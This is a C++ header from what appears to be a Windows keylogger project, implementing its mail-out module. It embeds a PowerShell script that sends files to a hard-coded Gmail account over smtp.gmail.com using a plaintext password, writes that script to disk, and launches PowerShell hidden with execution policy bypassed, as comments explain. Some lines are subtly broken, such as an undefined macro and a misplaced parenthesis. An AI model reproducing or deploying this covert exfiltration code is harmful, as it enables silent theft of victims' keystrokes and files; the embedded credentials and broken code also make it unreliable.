#ifndef SENDMAIL_H
#define SENDMAIL_H

#include<fstream>
#include<vector>
#include<windows.h>
#include <IO.h>
#include <Helper.h>
#include <Helper.h>

#define SCRIPT_NAME "sm.ps1"
namespace Mail
{
    #define X_EM_TO "jobs.abt.kl@gmail.com"
    #define X_EM_FROM "jobs.abt.kl@gmail.com" //both email are same bcz u can send this to urself
    #define X_EM_PASS "Jobs.ABT7.KL"

const std::string &PowerShellScript =
"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
"  ForEach ($val in $Attachments)\r\n                    "
"        {\r\n               "
"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
"}\r\n                catch\r\n                    {\r\n                        exit 2; "
"\r\n                    }\r\n            }\r\n "
"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
"  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
"Send-EMail -attachment $Att "
"-To \"" +
 std::string (X_EM_TO) +
 "\""
" -Body $Body -Subject $Subj "
"-password \"" +
 std::string (X_EM_PASS) +
  "\""
" -From \"" +
 std::string (X_EM_FROM) +
"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";



#undef X_EM_FROM
#undef X_EM_TO
#undef X_EM_PASS

std::string StringReplace(std::string s, const std::string &what, const std::string &with)
{
    if(what.empty())
        return s;
    size_t sp=0;
    while((sp=s.find(what,sp)) !=std::string::npos) //
        s.replace(sp, what.length(), with), sp+=with.length();
    return s;
}
    bool CheckFileExists(const std::string &f)
    { //check if file exists or not
        std::ifstream file (f);
        return (bool) file;
    }
    //error checking way
    bool CreateScript()
    {
        std::ofstream script(IO::GetOurPath(true))+std::string(STRING_NAME); //for creating our powershell script//this is o/p file stream and we have created a file descriptor which called script and into that file 2 functions are passing one is from our IO header(GetOurPath) whose return value will concatenated with the script name
        if(!script) //checking status of file
            return false;
        script<<PowerShellScript; //o/p the entire script to the file

        if(!script) //checking whether the writing in the file is okay or not
            return false;
        script.close();
        return true;
    }
    Timer m_timer;
    int SendMail(const std::string &subject,  const std::string &body, const std::string &attachments)
    {
        bool ok; //for testing
        ok=IO::MKDir()(IO::GetOurPath(true)); //creating our directory
        if(!ok)
            return -1; //unable to create directory
        std::string scr_path=IO::GetOurPath(true)+std::string(SCRIPT_NAME); //useful for debugging
        if(!CheckFileExists(scr_path))
            ok=CreateScript();
        if(!ok)
            return -2;
        //powershell require an admin privileges to execute a given script
        //we can use default flag which u can pass to powershell upon calling script which goes like executiion policy bypass
        std::string param="-ExecutionPolicy ByPass -File \""+scr_path+"\" -Subj\""+StringReplace(subject, "\"", "\\\"")+"\" -Body\""+StringReplace(body, "\"", "\\\"")+"\" -Att \"" +attachments+"\"";
        //structure creation
        SHELLEXECUTEINFO ShExecInfo={0};
        ShExecInfo.cbSize=sizeof(SHELLEXECUTEINFO); //defining size
        ShExecInfo.fMask=SEE_MASK_NOCLOSEPROCESS; //use to prevent powershell from terminating immediately
        ShExecInfo.hwnd=NULL; //handle to a window
        ShExecInfo.lpVerb="open"; //lp=long pointer
        ShExecInfo.lpFile="powershell";
        ShExecInfo.lpParameters=param.c_str();
        ShExecInfo.lpDirectory=NULL; //represent working dir
        ShExecInfo.nShow=SW_HIDE; //this will hide the window
        ShExecInfo.hInstApp=NULL; //handle the instant
        //calling the func
        ok=(bool)ShellExecuteEx(&ShExecInfo);
        //verification that this can be handled
        if(!ok)
            return -3;

        WaitForSingleObject(ShExecInfo.hProcess,7000); //waiting for 7 sec
        DWORD exit_code=100; //100 is arbitrary
        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code); //checking how powershell worked out

        m_timer.SetFunction([&]() //lambda function for accessing all var from the sendmail function
        {
            WaitForSingleObject(ShExecInfo.hProcess, 60000);
            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code); //getting exit code
            //comparing that exit code to 259. 259 is consistent windows api, if return 259 it means it's still active
            if((int)exit_code==STILL_ACTIVE)
                TerminateProcess(ShExecInfo.hProcess, 100);
            Helper::WriteAppLog("<From SendMail> Return code: "+ Helper::ToString((int)exit_code));
        });

        m_timer.RepeatCount(1L);
        m_timer.SetInterval(10L);
        m_timer.Start(true);
        return (int)exit_code;
    }
    //overloading function because we want able to send multiple attachment
    int SendMail(const std::string &subject, const std::string &body, const std::vector<std::string> &att) //able to pass multiple attachment along with mail
    {
        std::string attachments ="";
        if(att.size()==1U) //1U unsigned integer
            attachments=att.at(0);
        else
            //string construction
        {
            for (const auto &v:att)
                attachments+= v+ "::";
            attachments=attachments.substr(0,attachments.length()-2);
        }
        return SendMail(subject, body, attachments);
    }
}
#endif // SENDMAIL_H
